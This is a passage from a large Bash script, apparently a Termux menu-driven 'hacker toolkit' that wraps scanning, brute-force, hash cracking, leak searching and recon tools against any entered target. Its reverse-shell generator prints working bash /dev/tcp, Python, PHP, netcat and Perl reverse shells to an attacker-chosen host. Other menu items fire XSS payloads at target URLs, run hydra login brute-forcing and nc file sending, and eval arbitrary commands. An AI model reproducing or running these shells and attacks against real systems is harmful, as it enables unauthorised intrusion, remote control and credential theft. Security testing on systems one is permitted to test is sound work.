                    printf "  ${C11}[*] masscan on %s ports %s...${RESET}\n\n" "$target" "$ports"
                    masscan "$target" -p"$ports" --rate=1000 | tee "$HACKDIR/masscan_$(date +%Y%m%d_%H%M%S).txt"
                else
                    printf "  ${RED}masscan not installed${RESET}\n"
                    printf "  ${WH}Install: pkg install masscan${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            23)
                echo ""
                printf "  ${WH}[1] Listen on port  [2] Connect to host:port  [3] Banner grab  [4] Send file: ${RESET}"; read -r ncm
                echo ""
                case "$ncm" in
                    1) printf "  ${WH}Port: ${RESET}"; read -r ncport
                       printf "  ${C11}[*] Listening on port %s (Ctrl+C to stop)...${RESET}\n\n" "$ncport"
                       nc -lvp "$ncport" ;;
                    2) printf "  ${WH}host:port: ${RESET}"; read -r nchp
                       local nchost="${nchp%%:*}"; local ncport="${nchp##*:}"
                       printf "  ${C11}[*] Connecting to %s:%s...${RESET}\n\n" "$nchost" "$ncport"
                       nc "$nchost" "$ncport" ;;
                    3) printf "  ${WH}host:port: ${RESET}"; read -r nchp
                       local nchost="${nchp%%:*}"; local ncport="${nchp##*:}"
                       printf "  ${C11}[*] Banner grab from %s:%s...${RESET}\n\n" "$nchost" "$ncport"
                       echo "" | nc -w3 "$nchost" "$ncport" ;;
                    4) printf "  ${WH}File to send: ${RESET}"; read -r ncfile
                       printf "  ${WH}Destination host:port: ${RESET}"; read -r nchp
                       local nchost="${nchp%%:*}"; local ncport="${nchp##*:}"
                       nc "$nchost" "$ncport" < "$ncfile" && printf "  ${GRN}✓ File sent${RESET}\n" ;;
                    *) printf "  ${RED}Invalid${RESET}\n" ;;
                esac
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            24)
                echo ""; printf "  ${WH}Domain or IP (or file of domains): ${RESET}"; read -r target
                [[ -z "$target" ]] && continue
                echo ""
                if command -v dnsx &>/dev/null; then
                    printf "  ${C11}[*] dnsx resolve: %s...${RESET}\n\n" "$target"
                    if [[ -f "$target" ]]; then
                        dnsx -l "$target" -resp
                    else
                        echo "$target" | dnsx -resp
                    fi
                else
                    printf "  ${RED}dnsx not installed${RESET}\n"
                    printf "  ${WH}Install: pkg install golang && go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            25)
                echo ""; printf "  ${WH}URL or file of URLs: ${RESET}"; read -r target
                [[ -z "$target" ]] && continue
                echo ""
                if command -v httpx &>/dev/null; then
                    printf "  ${C11}[*] httpx probe: %s...${RESET}\n\n" "$target"
                    if [[ -f "$target" ]]; then
                        httpx -l "$target" -status-code -title -tech-detect
                    else
                        echo "$target" | httpx -status-code -title -tech-detect
                    fi
                else
                    printf "  ${RED}httpx not installed${RESET}\n"
                    printf "  ${WH}Install: pkg install golang && go install github.com/projectdiscovery/httpx/cmd/httpx@latest${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            26)
                echo ""; printf "  ${WH}Target host: ${RESET}"; read -r target
                [[ -z "$target" ]] && continue
                echo ""
                if command -v mtr &>/dev/null; then
                    printf "  ${C11}[*] mtr traceroute to %s...${RESET}\n\n" "$target"
                    mtr --report "$target"
                else
                    printf "  ${WH}mtr not installed — falling back to traceroute${RESET}\n\n"
                    traceroute "$target" 2>/dev/null || printf "  ${RED}traceroute not found either — pkg install traceroute${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            27)
                echo ""; printf "  ${WH}Domain: ${RESET}"; read -r domain
                [[ -z "$domain" ]] && continue
                echo ""; printf "  ${WH}Record type (A/MX/TXT/NS/CNAME/ANY): ${RESET}"; read -r rtype
                [[ -z "$rtype" ]] && rtype="ANY"
                echo ""
                printf "  ${C11}[*] dig %s %s...${RESET}\n\n" "$rtype" "$domain"
                dig "$rtype" "$domain" 2>/dev/null || nslookup -type="$rtype" "$domain"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;

            # ── PASSWORD & HASH ────────────────────────────────────────────
            28)
                echo ""; printf "  ${WH}Protocol [ssh/ftp/http-get/http-post/smb/...]: ${RESET}"; read -r proto
                echo ""; printf "  ${WH}Target host: ${RESET}"; read -r target
                echo ""; printf "  ${WH}Username or user file: ${RESET}"; read -r huser
                echo ""; printf "  ${WH}Password list (default: rockyou.txt): ${RESET}"; read -r hpass
                [[ -z "$hpass" ]] && hpass="/usr/share/wordlists/rockyou.txt"
                echo ""
                if command -v hydra &>/dev/null; then
                    printf "  ${C11}[*] hydra brute-force %s on %s...${RESET}\n\n" "$proto" "$target"
                    mkdir -p "$HACKDIR"
                    if [[ -f "$huser" ]]; then
                        hydra -L "$huser" -P "$hpass" "$target" "$proto" | tee "$HACKDIR/hydra_$(date +%Y%m%d_%H%M%S).txt"
                    else
                        hydra -l "$huser" -P "$hpass" "$target" "$proto" | tee "$HACKDIR/hydra_$(date +%Y%m%d_%H%M%S).txt"
                    fi
                else
                    printf "  ${RED}hydra not installed${RESET}\n"
                    printf "  ${WH}Install: pkg install hydra${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            29)
                echo ""
                printf "  ${WH}[1] Crack hash file  [2] Identify hash  [3] Benchmark: ${RESET}"; read -r jm
                echo ""
                if command -v john &>/dev/null; then
                    case "$jm" in
                        1) printf "  ${WH}Hash file path: ${RESET}"; read -r hfile
                           printf "  ${WH}Wordlist (default: rockyou.txt): ${RESET}"; read -r jw
                           [[ -z "$jw" ]] && jw="/usr/share/wordlists/rockyou.txt"
                           printf "  ${C11}[*] John cracking...${RESET}\n\n"
                           john --wordlist="$jw" "$hfile" ;;
                        2) printf "  ${WH}Hash file: ${RESET}"; read -r hfile
                           john --list=format-all 2>/dev/null | head -20 ;;
                        3) john --test ;;
                        *) printf "  ${RED}Invalid${RESET}\n" ;;
                    esac
                else
                    printf "  ${RED}john not installed${RESET}\n"
                    printf "  ${WH}Install: pkg install john${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            30)
                echo ""
                if command -v hashcat &>/dev/null; then
                    printf "  ${WH}[1] Wordlist attack  [2] Brute-force  [3] Show cracked  [4] Benchmark: ${RESET}"; read -r hcm
                    echo ""
                    case "$hcm" in
                        1) printf "  ${WH}Hash file: ${RESET}"; read -r hfile
                           printf "  ${WH}Hash type (e.g. 0=MD5 1000=NTLM 1800=sha512): ${RESET}"; read -r htype
                           printf "  ${WH}Wordlist: ${RESET}"; read -r wl
                           [[ -z "$wl" ]] && wl="/usr/share/wordlists/rockyou.txt"
                           hashcat -m "$htype" "$hfile" "$wl" --force ;;
                        2) printf "  ${WH}Hash file: ${RESET}"; read -r hfile
                           printf "  ${WH}Hash type: ${RESET}"; read -r htype
                           printf "  ${WH}Mask (e.g. ?a?a?a?a?a?a): ${RESET}"; read -r mask
                           hashcat -m "$htype" -a 3 "$hfile" "$mask" --force ;;
                        3) printf "  ${WH}Hash file: ${RESET}"; read -r hfile
                           printf "  ${WH}Hash type: ${RESET}"; read -r htype
                           hashcat -m "$htype" "$hfile" --show ;;
                        4) hashcat -b --force ;;
                        *) printf "  ${RED}Invalid${RESET}\n" ;;
                    esac
                else
                    printf "  ${RED}hashcat not installed${RESET}\n"
                    printf "  ${WH}Install: pkg install hashcat${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            31)
                echo ""; printf "  ${WH}Paste hash to identify: ${RESET}"; read -r hashval
                [[ -z "$hashval" ]] && continue
                echo ""
                printf "  ${C11}[*] Identifying hash type...${RESET}\n\n"
                local hlen=${#hashval}
                printf "  ${WH}Length: %s chars${RESET}\n\n" "$hlen"
                case "$hlen" in
                    32)  printf "  ${GRN}→ Likely: MD5 (most common), NTLM, MD4${RESET}\n" ;;
                    40)  printf "  ${GRN}→ Likely: SHA-1, MySQL5${RESET}\n" ;;
                    56)  printf "  ${GRN}→ Likely: SHA-224${RESET}\n" ;;
                    64)  printf "  ${GRN}→ Likely: SHA-256, Keccak-256${RESET}\n" ;;
                    96)  printf "  ${GRN}→ Likely: SHA-384${RESET}\n" ;;
                    128) printf "  ${GRN}→ Likely: SHA-512, Whirlpool${RESET}\n" ;;
                    *)   printf "  ${YEL}→ Unknown length — try hashid: pip install hashid${RESET}\n" ;;
                esac
                if command -v hashid &>/dev/null; then
                    echo ""
                    printf "  ${C11}hashid output:${RESET}\n"
                    hashid "$hashval"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            32)
                echo ""
                printf "  ${WH}[1] By charset  [2] Numbers only  [3] Alpha only  [4] Mixed  [5] Custom: ${RESET}"; read -r crm
                echo ""
                if command -v crunch &>/dev/null; then
                    printf "  ${WH}Min length: ${RESET}"; read -r cmin
                    printf "  ${WH}Max length: ${RESET}"; read -r cmax
                    local crout="$HACKDIR/wordlist_$(date +%Y%m%d_%H%M%S).txt"
                    mkdir -p "$HACKDIR"
                    case "$crm" in
                        1) printf "  ${WH}Charset (e.g. abc123): ${RESET}"; read -r cset
                           crunch "$cmin" "$cmax" "$cset" -o "$crout" ;;
                        2) crunch "$cmin" "$cmax" 0123456789 -o "$crout" ;;
                        3) crunch "$cmin" "$cmax" abcdefghijklmnopqrstuvwxyz -o "$crout" ;;
                        4) crunch "$cmin" "$cmax" abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -o "$crout" ;;
                        5) printf "  ${WH}Pattern (e.g. @@@@%%): ${RESET}"; read -r cpat
                           crunch "$cmin" "$cmax" -t "$cpat" -o "$crout" ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; continue ;;
                    esac
                    printf "\n  ${GRN}✓ Wordlist → %s${RESET}\n" "$crout"
                else
                    printf "  ${RED}crunch not installed${RESET}\n"
                    printf "  ${WH}Install: pkg install crunch${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            33)
                echo ""
                printf "  ${C11}[*] Wordlist preview:${RESET}\n\n"
                printf "  ${WH}[1] rockyou.txt  [2] Custom path: ${RESET}"; read -r wlm
                case "$wlm" in
                    1) head -50 /usr/share/wordlists/rockyou.txt 2>/dev/null || printf "  ${RED}rockyou.txt not found${RESET}\n" ;;
                    2) printf "  ${WH}Path: ${RESET}"; read -r wlp; head -50 "$wlp" 2>/dev/null || printf "  ${RED}Not found${RESET}\n" ;;
                esac
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;

            # ── MISC TOOLS ─────────────────────────────────────────────────
            34)
                echo ""; printf "  ${WH}Target URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                if [[ -d ~/WebSift ]]; then
                    mkdir -p "$SECDIR"
                    printf "  ${C11}[*] WebSift OSINT on %s...${RESET}\n\n" "$url"
                    local wsout="$SECDIR/websift_$(date +%Y%m%d_%H%M%S).txt"
                    python3 ~/WebSift/WebSift.py "$url" 2>/dev/null | tee "$wsout" || \
                    python3 ~/WebSift/main.py "$url" 2>/dev/null | tee "$wsout"
                    printf "\n  ${GRN}✓ Saved → %s${RESET}\n" "$wsout"
                else
                    printf "  ${RED}WebSift not cloned${RESET}\n"
                    printf "  ${WH}Install: git clone https://github.com/s-r-e-e-r-a-j/WebSift.git ~/WebSift${RESET}\n"
                    printf "  ${WH}         pip install requests beautifulsoup4 --break-system-packages${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            35)
                echo ""; printf "  ${WH}Target domain: ${RESET}"; read -r domain
                [[ -z "$domain" ]] && continue
                echo ""
                if [[ -d ~/Surface-Watchdog ]]; then
                    mkdir -p "$SECDIR"
                    printf "  ${C11}[*] Surface Watchdog OSINT on %s...${RESET}\n\n" "$domain"
                    local swout="$SECDIR/surface_watchdog_${domain}_$(date +%Y%m%d_%H%M%S).txt"
                    cd ~/Surface-Watchdog && python3 main.py "$domain" 2>/dev/null | tee "$swout"
                    cd - >/dev/null
                    printf "\n  ${GRN}✓ Saved → %s${RESET}\n" "$swout"
                else
                    printf "  ${RED}Surface Watchdog not cloned${RESET}\n"
                    printf "  ${WH}Install: git clone https://github.com/khast3x/Surface-Watchdog.git ~/Surface-Watchdog${RESET}\n"
                    printf "  ${WH}         pip install -r ~/Surface-Watchdog/requirements.txt --break-system-packages${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            36)
                echo ""; printf "  ${WH}Command: ${RESET}"; read -r cmd
                [[ -z "$cmd" ]] && continue
                echo ""
                eval "$cmd"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;

            # ── ADVANCED ARSENAL ───────────────────────────────────────────
            37)
                echo ""; printf "  ${WH}CVE ID or keyword: ${RESET}"; read -r cve
                [[ -z "$cve" ]] && continue
                echo ""
                printf "  ${C11}[*] Searching CVE database for: %s${RESET}\n\n" "$cve"
                if command -v searchsploit &>/dev/null; then
                    searchsploit "$cve"
                else
                    printf "  ${WH}[*] Using cve.mitre.org API...${RESET}\n"
                    curl -s "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=$cve" | grep -i "CVE-" | head -20
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            38)
                echo ""
                printf "  ${C11}REVERSE SHELL GENERATOR${RESET}\n\n"
                printf "  ${WH}[1] Bash  [2] Python  [3] PHP  [4] Netcat  [5] Perl: ${RESET}"; read -r sh_type
                printf "  ${WH}LHOST (your IP): ${RESET}"; read -r lhost
                printf "  ${WH}LPORT (your port): ${RESET}"; read -r lport
                echo ""
                case "$sh_type" in
                    1) printf "  ${GRN}bash -i >& /dev/tcp/%s/%s 0>&1${RESET}\n" "$lhost" "$lport" ;;
                    2) printf "  ${GRN}python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'${RESET}\n" "$lhost" "$lport" ;;
                    3) printf "  ${GRN}php -r '\$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'${RESET}\n" "$lhost" "$lport" ;;
                    4) printf "  ${GRN}nc -e /bin/sh %s %s${RESET}\n" "$lhost" "$lport" ;;
                    5) printf "  ${GRN}perl -e 'use Socket;\$i=\"%s\";\$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'${RESET}\n" "$lhost" "$lport" ;;
                    *) printf "  ${RED}Invalid${RESET}\n" ;;
                esac
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            39)
                echo ""
                printf "  ${C11}PAYLOAD ENCODER${RESET}\n\n"
                printf "  ${WH}Payload to encode: ${RESET}"; read -r payload
                printf "  ${WH}[1] Base64  [2] URL  [3] Hex  [4] Double Base64: ${RESET}"; read -r enc_type
                echo ""
                case "$enc_type" in
                    1) printf "  ${GRN}%s${RESET}\n" "$(echo -n "$payload" | base64)" ;;
                    2) printf "  ${GRN}%s${RESET}\n" "$(echo -n "$payload" | jq -sRr @uri 2>/dev/null || python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")" ;;
                    3) printf "  ${GRN}%s${RESET}\n" "$(echo -n "$payload" | xxd -p | tr -d '\n')" ;;
                    4) printf "  ${GRN}%s${RESET}\n" "$(echo -n "$payload" | base64 | base64)" ;;
                    *) printf "  ${RED}Invalid${RESET}\n" ;;
                esac
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            40)
                echo ""; printf "  ${WH}Target URL with param (e.g., site.com/page?id=): ${RESET}"; read -r xss_url
                [[ -z "$xss_url" ]] && continue
                echo ""
                printf "  ${C11}[*] Testing XSS vectors on %s${RESET}\n\n" "$xss_url"
                local xss_payloads=(
                    "<script>alert('XSS')</script>"
                    "<img src=x onerror=alert('XSS')>"
                    "'\"><script>alert(String.fromCharCode(88,83,83))</script>"
                    "<svg/onload=alert('XSS')>"
                )
                for xp in "${xss_payloads[@]}"; do
                    local test_url="${xss_url}${xp}"
                    printf "  ${FADE}Testing: %s${RESET}\n" "$xp"
                    curl -s -L "$test_url" | grep -i "alert\|script" && printf "  ${RED}✗ Potential XSS vulnerability${RESET}\n" || printf "  ${GRN}✓ Clean${RESET}\n"
                done
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            41)
                echo ""; printf "  ${WH}Target domain: ${RESET}"; read -r ssl_target
                [[ -z "$ssl_target" ]] && continue
                echo ""
                printf "  ${C11}[*] SSL/TLS audit for %s${RESET}\n\n" "$ssl_target"
                if command -v sslscan &>/dev/null; then
                    sslscan "$ssl_target"
                elif command -v testssl.sh &>/dev/null; then
                    testssl.sh "$ssl_target"
                else
                    printf "  ${WH}[*] Basic certificate check via openssl...${RESET}\n\n"
                    echo | openssl s_client -connect "${ssl_target}:443" -servername "$ssl_target" 2>/dev/null | openssl x509 -noout -text
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            42)
                echo ""; printf "  ${WH}Subdomain to check for takeover: ${RESET}"; read -r takeover_sub
                [[ -z "$takeover_sub" ]] && continue
                echo ""
                printf "  ${C11}[*] Checking %s for subdomain takeover...${RESET}\n\n" "$takeover_sub"
                local cname; cname=$(dig "$takeover_sub" CNAME +short | head -1)
                if [[ -n "$cname" ]]; then
                    printf "  ${WH}CNAME points to: %s${RESET}\n" "$cname"
                    if echo "$cname" | grep -qE "github|amazonaws|azurewebsites|herokuapp|zendesk"; then
                        printf "  ${RED}⚠ Potential takeover target detected!${RESET}\n"
                        printf "  ${WH}Try registering: %s${RESET}\n" "$cname"
                    else
                        printf "  ${GRN}✓ No obvious takeover pattern${RESET}\n"
                    fi
                else
                    printf "  ${FADE}No CNAME found${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            43)
                echo ""; printf "  ${WH}GitHub search query (e.g., 'api_key', 'password'): ${RESET}"; read -r gh_query
                [[ -z "$gh_query" ]] && continue
                echo ""
                printf "  ${C11}[*] GitHub dorking for: %s${RESET}\n\n" "$gh_query"
                printf "  ${WH}[*] Opening GitHub code search in browser...${RESET}\n"
                termux-open-url "https://github.com/search?q=${gh_query}&type=code" 2>/dev/null || xdg-open "https://github.com/search?q=${gh_query}&type=code" 2>/dev/null
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            44)
                echo ""; printf "  ${WH}Search term for pastebin leaks: ${RESET}"; read -r paste_query
                [[ -z "$paste_query" ]] && continue
                echo ""
                printf "  ${C11}[*] Searching pastebin for: %s${RESET}\n\n" "$paste_query"
                printf "  ${WH}[*] Using psbdmp.ws API...${RESET}\n\n"
                curl -s "https://psbdmp.ws/api/search/$paste_query" | head -20
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            45)
                echo ""; printf "  ${WH}Target IP: ${RESET}"; read -r knock_ip
                printf "  ${WH}Port sequence (space-separated, e.g., 7000 8000 9000): ${RESET}"; read -r knock_ports
                [[ -z "$knock_ip" || -z "$knock_ports" ]] && continue
                echo ""
                printf "  ${C11}[*] Sending port knock sequence to %s${RESET}\n" "$knock_ip"
                for kp in $knock_ports; do
                    printf "  ${FADE}Knock: %s${RESET}\n" "$kp"
                    nc -w 1 "$knock_ip" "$kp" 2>/dev/null &
                    sleep 0.5
                done
                printf "\n  ${GRN}✓ Sequence sent${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            46)
                echo ""; printf "  ${WH}Domain for zone transfer test: ${RESET}"; read -r zt_domain
                [[ -z "$zt_domain" ]] && continue
                echo ""
                printf "  ${C11}[*] Testing DNS zone transfer for %s${RESET}\n\n" "$zt_domain"
                local ns_server; ns_server=$(dig "$zt_domain" NS +short | head -1)
                if [[ -n "$ns_server" ]]; then
                    printf "  ${WH}NS server: %s${RESET}\n" "$ns_server"
                    dig @"$ns_server" "$zt_domain" AXFR
                else
                    printf "  ${RED}No NS server found${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            47)
                echo ""
                printf "  ${C11}LIVE PACKET SNIFFER (tcpdump)${RESET}\n\n"
                printf "  ${WH}Available interfaces:${RESET}\n"
                ip link show 2>/dev/null | grep -E '^[0-9]+:' | awk '{print "  " $2}' | tr -d ':'
                echo ""
                printf "  ${WH}Interface (or 'any' for all): ${RESET}"; read -r sniff_int
                printf "  ${WH}Filter (or ENTER for all traffic): ${RESET}"; read -r sniff_filter
                echo ""
                printf "  ${C11}[*] Starting tcpdump on %s...${RESET}\n" "${sniff_int:-any}"
                printf "  ${FADE}Ctrl+C to stop${RESET}\n\n"
                if [[ -n "$sniff_filter" ]]; then
                    tcpdump -i "${sniff_int:-any}" "$sniff_filter" 2>/dev/null
                else
                    tcpdump -i "${sniff_int:-any}" 2>/dev/null
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            48)
                echo ""; printf "  ${WH}Target domain for AUTO-RECON: ${RESET}"; read -r ar_target
                [[ -z "$ar_target" ]] && continue
                echo ""
                mkdir -p "$HACKDIR/autorecon_${ar_target}"
                local ar_dir="$HACKDIR/autorecon_${ar_target}"
                printf "  ${C11}[*] AUTO-RECON CHAIN INITIATED ON %s${RESET}\n\n" "$ar_target"
                printf "  ${WH}[1/5] WHOIS lookup...${RESET}\n"
                whois "$ar_target" > "$ar_dir/whois.txt" 2>&1
                printf "  ${WH}[2/5] DNS records...${RESET}\n"
                dig "$ar_target" ANY +noall +answer > "$ar_dir/dns.txt" 2>&1
                printf "  ${WH}[3/5] Subdomain enum (subfinder)...${RESET}\n"
                if command -v subfinder &>/dev/null; then
                    subfinder -d "$ar_target" -o "$ar_dir/subdomains.txt" -silent
                else
                    echo "subfinder not installed — skipping" > "$ar_dir/subdomains.txt"
                fi
                printf "  ${WH}[4/5] Port scan (nmap -F)...${RESET}\n"
                nmap -F "$ar_target" > "$ar_dir/nmap.txt" 2>&1
                printf "  ${WH}[5/5] HTTP probe (httpx)...${RESET}\n"
                if command -v httpx &>/dev/null && [[ -f "$ar_dir/subdomains.txt" ]]; then
                    cat "$ar_dir/subdomains.txt" | httpx -silent > "$ar_dir/live_hosts.txt" 2>&1
                else
                    echo "httpx not installed — skipping" > "$ar_dir/live_hosts.txt"
                fi
                printf "\n  ${GRN}✓ AUTO-RECON COMPLETE${RESET}\n"
                printf "  ${WH}Results saved to: %s${RESET}\n" "$ar_dir"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;

            # ── INSTALL CATEGORIES ─────────────────────────────────────────
            a|A)
                echo ""
                printf "  ${C11}[INSTALL]${RESET} ${WH}OSINT & Recon tools${RESET}\n\n"
                pkg install nmap whois curl python git -y
                pip install sherlock-project holehe theHarvester shodan recon-ng anubis-netsec --break-system-packages
                git clone https://github.com/s0md3v/Photon.git ~/Photon 2>/dev/null || printf "  ${FADE}Photon: already exists${RESET}\n"
                pip install -r ~/Photon/requirements.txt --break-system-packages 2>/dev/null
                printf "\n  ${GRN}✓ OSINT tools installed${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            b|B) return 0 ;;
            c|C)
                echo ""
                printf "  ${C11}[INSTALL]${RESET} ${WH}Network tools${RESET}\n\n"
                pkg install nmap masscan netcat-openbsd mtr traceroute dnsutils -y
                printf "  ${WH}dnsx/httpx/subfinder require Go: pkg install golang${RESET}\n"
                printf "  ${GRN}✓ Network tools installed${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            d|D)
                echo ""
                printf "  ${C11}[INSTALL]${RESET} ${WH}Password & Hash tools${RESET}\n\n"
                pkg install hydra john hashcat crunch -y
                pip install hashid --break-system-packages
                printf "  ${GRN}✓ Password tools installed${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            e|E)
                echo ""
                printf "  ${C11}[INSTALL]${RESET} ${WH}WebSift${RESET}\n\n"
                git clone https://github.com/s-r-e-e-r-a-j/WebSift.git ~/WebSift 2>/dev/null || printf "  ${YEL}WebSift dir exists, pulling...${RESET}\n" && git -C ~/WebSift pull 2>/dev/null
                pip install requests beautifulsoup4 --break-system-packages
                printf "  ${GRN}✓ WebSift installed → ~/WebSift${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            f|F)
                echo ""
                printf "  ${C11}[INSTALL]${RESET} ${WH}Surface Watchdog${RESET}\n\n"
                git clone https://github.com/khast3x/Surface-Watchdog.git ~/Surface-Watchdog 2>/dev/null || printf "  ${YEL}Already exists, pulling...${RESET}\n" && git -C ~/Surface-Watchdog pull 2>/dev/null
                pip install -r ~/Surface-Watchdog/requirements.txt --break-system-packages
                printf "  ${GRN}✓ Surface Watchdog installed → ~/Surface-Watchdog${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            g|G)
                echo ""
                printf "  ${C11}[INSTALL]${RESET} ${WH}Web Application tools${RESET}\n\n"
                pkg install sqlmap nikto ruby -y
                gem install whatweb 2>/dev/null
                pip install wafw00f --break-system-packages
                printf "  ${WH}gobuster/ffuf require Go: pkg install golang${RESET}\n"
                printf "  ${GRN}✓ Web tools installed${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            m|M) media_station_portal; return ;;
            z|Z)
                echo ""
                printf "  ${C11}[INSTALL ALL]${RESET} ${WH}Full hacker toolkit — this will take a while...${RESET}\n\n"
                pkg install nmap whois sqlmap nikto hydra john hashcat crunch masscan netcat-openbsd mtr traceroute dnsutils curl python git ruby -y
                pip install sherlock-project holehe theHarvester shodan recon-ng anubis-netsec wafw00f hashid --break-system-packages
                gem install whatweb 2>/dev/null
                git clone https://github.com/s0md3v/Photon.git ~/Photon 2>/dev/null && pip install -r ~/Photon/requirements.txt --break-system-packages 2>/dev/null
                git clone https://github.com/s-r-e-e-r-a-j/WebSift.git ~/WebSift 2>/dev/null && pip install requests beautifulsoup4 --break-system-packages
                git clone https://github.com/khast3x/Surface-Watchdog.git ~/Surface-Watchdog 2>/dev/null && pip install -r ~/Surface-Watchdog/requirements.txt --break-system-packages
                printf "\n  ${GRN}✓ Full hacker toolkit install complete${RESET}\n"
                printf "  ${FADE}Go/Rust tools (subfinder, dnsx, httpx, gobuster, ffuf): pkg install golang then run go install commands${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            t|T)
                echo ""
                printf "  ${C11}[*] Dropping to Termux shell — type 'exit' to return${RESET}\n\n"
                bash
                ;;
            *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
        esac
    done 2>/dev/null
}

# ═══════════════════════════════════════════════════════════════════
#  [12] PDF PORTAL — NEW IN V44
# ═══════════════════════════════════════════════════════════════════


# ═══════════════════════════════════════════════════════════════════
#  [13] DOCUMENTS PORTAL — NEW IN V44
# ═══════════════════════════════════════════════════════════════════


# ═══════════════════════════════════════════════════════════════════
#  [14] ANDROID BRIDGE PORTAL
# ═══════════════════════════════════════════════════════════════════

android_bridge_portal() {
    while true; do
        clear
        _portal_entry "Android Bridge" "${C14}"
        echo ""
        _dv14
        printf "  ${C14}${BOLD}ANDROID BRIDGE  —  termux-api · SMS · Camera · Location  ${RESET}\n"
        _dv14
        echo ""
        printf "  ${WH}termux-api · termux-sms · termux-camera · termux-location · termux-clipboard${RESET}\n"
        printf "  ${FADE}■ Whole phone in the terminal · camera · GPS · SMS · Bojack running the hardware from the inside · 999${RESET}\n"
        echo ""
        _dv14
        echo ""
        printf "  ${WH}[1]  SMS — read inbox, send messages                                 ${RESET}\n"
        printf "  ${WH}[2]  Call Log — recent call history                                  ${RESET}\n"
        printf "  ${WH}[3]  Camera — take photo, list cameras                               ${RESET}\n"
        printf "  ${WH}[4]  Location — get GPS coordinates                                  ${RESET}\n"
        printf "  ${WH}[5]  Clipboard — get and set clipboard content                       ${RESET}\n"
        printf "  ${WH}[6]  Notifications — list active notifications                       ${RESET}\n"
        printf "  ${WH}[7]  Vibrate — pulse the device                                      ${RESET}\n"
        printf "  ${WH}[8]  Torch — toggle flashlight on/off                                ${RESET}\n"
        printf "  ${WH}[9]  Battery Info — detailed battery status                          ${RESET}\n"
        printf "  ${WH}[10] Contacts — search contacts by name                              ${RESET}\n"
        printf "  ${WH}[11] WiFi — current connection info                                  ${RESET}\n"
        printf "  ${WH}[12] Volume — get/set media volume                                   ${RESET}\n"
        printf "  ${WH}[13] Toast — display Android toast notification                      ${RESET}\n"
        printf "  ${WH}[14] Install termux-api — install package + companion app            ${RESET}\n"
        echo ""
        _dv14
        echo ""
        printf "  ${C14}${BOLD}── NOTIFICATION TYPES ──────────────────────────────────────${RESET}\n"
        echo ""
        printf "  ${WH}[15] Basic Notification — title + message, simple                    ${RESET}\n"
        printf "  ${WH}[16] Big Text — long message, expands on tap                         ${RESET}\n"
        printf "  ${WH}[17] Heads-Up — pops on screen · urgent alert                        ${RESET}\n"
        printf "  ${WH}[18] Silent — no sound, no popup, tray only                          ${RESET}\n"
        printf "  ${WH}[19] Ongoing — persistent, stays until dismissed                     ${RESET}\n"
        printf "  ${WH}[20] Scheduled — send at a specific time                             ${RESET}\n"
